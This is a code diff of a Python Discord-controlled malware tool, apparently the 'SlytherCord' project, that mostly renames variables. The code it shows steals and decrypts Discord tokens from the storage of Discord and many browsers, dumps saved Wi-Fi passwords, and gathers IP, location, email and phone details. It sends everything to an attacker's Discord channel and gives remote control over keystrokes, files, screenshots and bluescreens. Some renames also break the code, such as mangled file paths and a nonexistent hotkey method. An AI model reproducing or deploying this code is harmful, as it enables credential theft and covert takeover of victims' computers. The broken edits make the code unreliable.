@@ -27,58 +27,58 @@ from ctypes import cast, POINTER
 
 file_api = "https://api.letsupload.cc/upload"
 wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""
-global grabembed
+global embedMessageWhenStarted
 
 tokens = []
-cleaned = []
+cleaned_tokens = []
 checker = []
 
 
 
 
 
-def start_program():
-    already_check = []
+def getTokenAndSearchForInfo():
+    already_checked_tokens = []
     checker = []
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    chrome = local + "\\Google\\Chrome\\User Data"
+    local_directory = os.getenv('LOCALAPPDATA')
+    roaming_directory = os.getenv('APPDATA')
+    chrome_directory = local_directory + "\\Google\\Chrome\\User Data"
     paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Lightcord': roaming + '\\Lightcord',
-        'Discord PTB': roaming + '\\discordptb',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-        'Amigo': local + '\\Amigo\\User Data',
-        'Torch': local + '\\Torch\\User Data',
-        'Kometa': local + '\\Kometa\\User Data',
-        'Orbitum': local + '\\Orbitum\\User Data',
-        'CentBrowser': local + '\\CentBrowser\\User Data',
-        '7Star': local + '\\7Star\\7Star\\User Data',
-        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': chrome + 'Default',
-        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
-        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Iridium': local + '\\Iridium\\User Data\\Default'
+        'Discord': roaming_directory + '\\discord',
+        'Discord Canary': roaming_directory + '\\discordcanary',
+        'Lightcord': roaming_directory + '\\Lightcord',
+        'Discord PTB': roaming_directory + '\\discordptb',
+        'Opera': roaming_directory + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming_directory + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local_directory + '\\Amigo\\User Data',
+        'Torch': local_directory + '\\Torch\\User Data',
+        'Kometa': local_directory + '\\Kometa\\User Data',
+        'Orbitum': local_directory + '\\Orbitum\\User Data',
+        'CentBrowser': local_directory + '\\CentBrowser\\User Data',
+        '7Star': local_directory + '\\7Star\\7Star\\User Data',
+        'Sputnik': local_directory + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local_directory + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local_directory + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome_directory + 'Default',
+        'Epic Privacy Browser': local_directory + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local_directory + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local_directory + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local_directory + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local_directory + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local_directory + '\\Iridium\\User Data\\Default'
     }
     for platform, path in paths.items():
         if not os.path.exists(path): continue
         try:
-            with open(path + f"\\Local State", "r") as file:
+            with open(path + f"\\local_directory State", "r") as file:
                 key = loads(file.read())['os_crypt']['encrypted_key']
                 file.close()
         except: continue
-        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+        for file in listdir(path + f"\\local_directory Storage\\leveldb\\"):
             if not file.endswith(".ldb") and file.endswith(".log"): continue
             else:
                 try:
-                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                    with open(path + f"\\local_directory Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                         for x in files.readlines():
                             x.strip()
                             for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
@@ -87,17 +87,17 @@ def start_program():
         for i in tokens:
             if i.endswith("\\"):
                 i.replace("\\", "")
-            elif i not in cleaned:
-                cleaned.append(i)
-        for token in cleaned:
+            elif i not in cleaned_tokens:
+                cleaned_tokens.append(i)
+        for token in cleaned_tokens:
             try:
                 global tok
                 tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
             except IndexError == "Error": continue
             checker.append(tok)
             for value in checker:
-                if value not in already_check:
-                    already_check.append(value)
+                if value not in already_checked_tokens:
+                    already_checked_tokens.append(value)
                     headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                     try:
                         res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
@@ -131,7 +131,7 @@ def start_program():
                 print("e")
 
 
-def volumeup():
+def setVolumeToMax():
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -139,7 +139,7 @@ def volumeup():
         volume.SetMute(0, None)
     volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
 
-def volumedown():
+def setVolumeToMin():
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -211,7 +211,7 @@ global mac_address
 mac_address = str(get_mac())
 @client.event
 async def on_ready():
-    start_program()
+    getTokenAndSearchForInfo()
     try:
         output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
         decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
@@ -229,40 +229,40 @@ async def on_ready():
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     username = os.getlogin()
-    grabembed=discord.Embed(title="**Grabbed info from: ** ```" + pc_username +"```",colour=0x3)
-    grabembed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
-    grabembed.add_field(name="**Token:**",value=f"```{tok}```",inline=True)
+    embedMessageWhenStarted=discord.Embed(title="**Grabbed info from: ** ```" + pc_username +"```",colour=0x3)
+    embedMessageWhenStarted.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
+    embedMessageWhenStarted.add_field(name="**Token:**",value=f"```{tok}```",inline=True)
     
-    grabembed.add_field(name="**Email:**",value=f"```{email}```",inline=True)
-    grabembed.add_field(name="**Username:**",value=f"```{pc_username}```",inline=True)
-    grabembed.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
-    grabembed.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
-    grabembed.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
-    grabembed.add_field(name="**Does blud have Nitro?**", value=f"```{nitro_statement}```",inline=True)
-    grabembed.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
-    grabembed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
-    grabembed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
-    grabembed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
-    grabembed.add_field(name="**City:**",value=f"```{city}```",inline=True)
-    grabembed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Email:**",value=f"```{email}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Username:**",value=f"```{pc_username}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Does blud have Nitro?**", value=f"```{nitro_statement}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Country:**", value=f"```{country}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**City:**",value=f"```{city}```",inline=True)
+    embedMessageWhenStarted.add_field(name="**Username:**",value=f"```{username}```",inline=True)
     try:
-        grabembed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
+        embedMessageWhenStarted.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
     except Exception as err:
-        grabembed.add_field(name="**SSID & Passwords:**",value=f"ERROR: Not able to extract. error message: \n {err}",inline=True)
-    grabembed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
-    grabembed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
-    grabembed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
-    grabembed.timestamp = datetime.utcnow()
+        embedMessageWhenStarted.add_field(name="**SSID & Passwords:**",value=f"ERROR: Not able to extract. error message: \n {err}",inline=True)
+    embedMessageWhenStarted.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
+    embedMessageWhenStarted.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
+    embedMessageWhenStarted.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
+    embedMessageWhenStarted.timestamp = datetime.utcnow()
 
 
 
     guild = client.get_guild(int(guild_id))
     channel = await find_channel_by_name(guild, mac_address)
     if channel:
-        await channel.send(embed=grabembed)
+        await channel.send(embed=embedMessageWhenStarted)
     else:
         channel = await guild.create_text_channel(mac_address)
-        e = await channel.send(embed=grabembed)
+        e = await channel.send(embed=embedMessageWhenStarted)
         await e.pin()
         await channel.send("hello world")
 @client.event
@@ -279,16 +279,15 @@ async def on_message(message):
                 case ".ping":
                     await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
                 case ".ls":
-                    import os
                     files = "\n".join(os.listdir())
                     if files == "":
                         files = "No Files Found"
                     embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                     await message.reply(embed=embed)  
                 case ".exit":
-                    new_msg = await message.reply("Are you sure you want to destroy the connection?")
-                    await new_msg.add_reaction("✅")
-                    await new_msg.add_reaction("❌")
+                    repliedMessage = await message.reply("Are you sure you want to destroy the connection?")
+                    await repliedMessage.add_reaction("✅")
+                    await repliedMessage.add_reaction("❌")
                     def check(reaction, user):
                         return user == message.author and str(reaction.emoji) in ["✅", "❌"]
 
@@ -298,16 +297,16 @@ async def on_message(message):
                            await message.channel.delete()
                            await client.close()
                         elif str(reaction.emoji) == "❌":
-                            delmsg =await message.channel.send("Cancelled.")
+                            messageAwaitedToDelete =await message.channel.send("Cancelled.")
                             await message.delete()
-                            await new_msg.delete()
-                            await delmsg.delete()
+                            await repliedMessage.delete()
+                            await messageAwaitedToDelete.delete()
                     except asyncio.TimeoutError:
                         await message.channel.send("You didn't react in time.")
                 case ".blue":
-                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
-                    await new_msg.add_reaction("✅")
-                    await new_msg.add_reaction("❌")
+                    repliedMessage = await message.reply("Are you sure you want to start a bluescreen?")
+                    await repliedMessage.add_reaction("✅")
+                    await repliedMessage.add_reaction("❌")
 
                     def check(reaction, user):
                         return user == message.author and str(reaction.emoji) in ["✅", "❌"]
@@ -325,10 +324,10 @@ async def on_message(message):
                             else:
                                 await message.reply("Blue Failed! :(")
                         elif str(reaction.emoji) == "❌":
-                            delmsg =await message.channel.send("Cancelled bluescreen.")
+                            messageAwaitedToDelete =await message.channel.send("Cancelled bluescreen.")
                             await message.delete()
-                            await new_msg.delete()
-                            await delmsg.delete()
+                            await repliedMessage.delete()
+                            await messageAwaitedToDelete.delete()
                     except asyncio.TimeoutError:
                         await message.channel.send("You didn't react in time.")
                 case ".ss":
@@ -361,9 +360,9 @@ async def on_message(message):
                     await message.channel.purge(limit=None) 
                 case ".reload":
 
-                    new_msg = await message.reply("Are you sure you want to Reload the connection?")
-                    await new_msg.add_reaction("✅")
-                    await new_msg.add_reaction("❌")
+                    repliedMessage = await message.reply("Are you sure you want to Reload the connection?")
+                    await repliedMessage.add_reaction("✅")
+                    await repliedMessage.add_reaction("❌")
                     def check(reaction, user):
                         return user == message.author and str(reaction.emoji) in ["✅", "❌"]
 
@@ -377,19 +376,19 @@ async def on_message(message):
                            
                            await client.close()
                         elif str(reaction.emoji) == "❌":
-                            delmsg =await message.channel.send("Cancelled.")
+                            messageAwaitedToDelete =await message.channel.send("Cancelled.")
                             await message.delete()
-                            await new_msg.delete()
-                            await delmsg.delete()
+                            await repliedMessage.delete()
+                            await messageAwaitedToDelete.delete()
                     except asyncio.TimeoutError:
                         await message.channel.send("You didn't react in time.")             
-                case ".volumeup":
-                    new_msg = await message.reply("Increasing the volume")
-                    volumeup()
+                case ".setVolumeToMax":
+                    repliedMessage = await message.reply("Increasing the volume")
+                    setVolumeToMax()
                     await channel.send("Volume is set to 100%")
-                case ".volumedown" :
-                    new_msg = await message.reply("Decreasing the volume")
-                    volumedown()
+                case ".setVolumeToMin" :
+                    repliedMessage = await message.reply("Decreasing the volume")
+                    setVolumeToMin()
                     await channel.send("Volume is set to 0%")
                 case ".admincheck":
                     import ctypes
@@ -474,58 +473,58 @@ async def on_message(message):
                 await message.reply(embed=embed)
                 await message.delete()
             elif message.content.lower().startswith(".cd"):
-                directory = message.content[4:]
+                desiredDirectory = message.content[4:]
                 
                 try:
-                    os.chdir(directory)
-                    files = "\n".join(os.listdir())
-                    if files == "":
-                        files = "No Files Found"
-                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+                    os.chdir(desiredDirectory)
+                    filesInDesiredDirectory = "\n".join(os.listdir())
+                    if filesInDesiredDirectory == "":
+                        filesInDesiredDirectory = "No Files Found"
+                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{filesInDesiredDirectory}```", color=0xfafafa)
                 except:
                     embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                 await message.reply(embed=embed)
                 await message.delete()
             elif message.content.lower().startswith(".input"):
-                command = message.content[7:].split()
-                key1 = command[0]
-                key2 = command[1] if len(command) > 1 else ""
-                key3 = command[2] if len(command) > 2 else ""
+                keyStrokeCollection = message.content[7:].split()
+                firstKey = keyStrokeCollection[0]
+                secondKey = keyStrokeCollection[1] if len(keyStrokeCollection) > 1 else ""
+                thirdKey = keyStrokeCollection[2] if len(keyStrokeCollection) > 2 else ""
 
-                keys = [key1, key2, key3]
-                hotkey = "+".join(keys)
+                keys = [firstKey, secondKey, thirdKey]
+                finishedKeyCollectionToSend = "+".join(keys)
 
-                new_msg = await message.reply(f"are you sure you want to send this keystroke? \n ``{hotkey}``")
-                await new_msg.add_reaction("✅")
-                await new_msg.add_reaction("❌")
+                repliedMessage = await message.reply(f"are you sure you want to send this keystroke? \n ``{finishedKeyCollectionToSend}``")
+                await repliedMessage.add_reaction("✅")
+                await repliedMessage.add_reaction("❌")
                 def check(reaction, user):
                     return user == message.author and str(reaction.emoji) in ["✅", "❌"]
                 try:
                     reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                     if str(reaction.emoji) == "✅":
                         try:
-                            pyautogui.hotkey(*keys)
+                            pyautogui.finishedKeyCollectionToSend(*keys)
                             e = await channel.send("Sent keystroke: " + str(keys))
                             await message.delete()
                             await e.delete()
-                            await new_msg.delete()
+                            await repliedMessage.delete()
                         except Exception as e:
-                            await channel.send(f"Failed to send keystroke: {hotkey} \nError: {str(e)}")
+                            await channel.send(f"Failed to send keystroke: {finishedKeyCollectionToSend} \nError: {str(e)}")
                             await message.delete()
-                            await new_msg.delete()
+                            await repliedMessage.delete()
 
                     elif str(reaction.emoji) == "❌":
-                        delmsg =await message.channel.send(f"Cancelled key press:{hotkey}")
+                        messageAwaitedToDelete =await message.channel.send(f"Cancelled key press:{finishedKeyCollectionToSend}")
                         await message.delete()
-                        await new_msg.delete()
-                        await delmsg.delete()
+                        await repliedMessage.delete()
+                        await messageAwaitedToDelete.delete()
                 except asyncio.TimeoutError:
                     await message.channel.send("You didn't react in time.")
             elif message.content.lower().startswith(".type"):
                 content = message.content[6:]
-                new_msg = await message.reply(f"are you sure you want to type this in as a keyboard? \n ``{content}``")
-                await new_msg.add_reaction("✅")
-                await new_msg.add_reaction("❌")
+                repliedMessage = await message.reply(f"are you sure you want to type this in as a keyboard? \n ``{content}``")
+                await repliedMessage.add_reaction("✅")
+                await repliedMessage.add_reaction("❌")
                 def check(reaction, user):
                     return user == message.author and str(reaction.emoji) in ["✅", "❌"]
                 try:
@@ -537,22 +536,22 @@ async def on_message(message):
                             e = await channel.send("Sent: " + content)
                             await message.delete()
                             await e.delete()
-                            await new_msg.delete()
+                            await repliedMessage.delete()
                         except Exception as e:
                             await channel.send(f"Failed to send keystroke: {content} \nError: {str(e)}")
                             await message.delete()
-                            await new_msg.delete()
+                            await repliedMessage.delete()
 
                     elif str(reaction.emoji) == "❌":
-                        delmsg =await message.channel.send(f"Cancelled to type: {content}")
+                        messageAwaitedToDelete =await message.channel.send(f"Cancelled to type: {content}")
                         await message.delete()
-                        await new_msg.delete()
-                        await delmsg.delete()
+                        await repliedMessage.delete()
+                        await messageAwaitedToDelete.delete()
                 except asyncio.TimeoutError:
                     await message.channel.send("You didn't react in time.")
             elif message.content.lower().startswith(".say"):
                 content = message.content[4:]
-                volumeup()
+                setVolumeToMax()
                 import comtypes
                 import win32com.client as wincl
                 speak = wincl.Dispatch("SAPI.SpVoice")
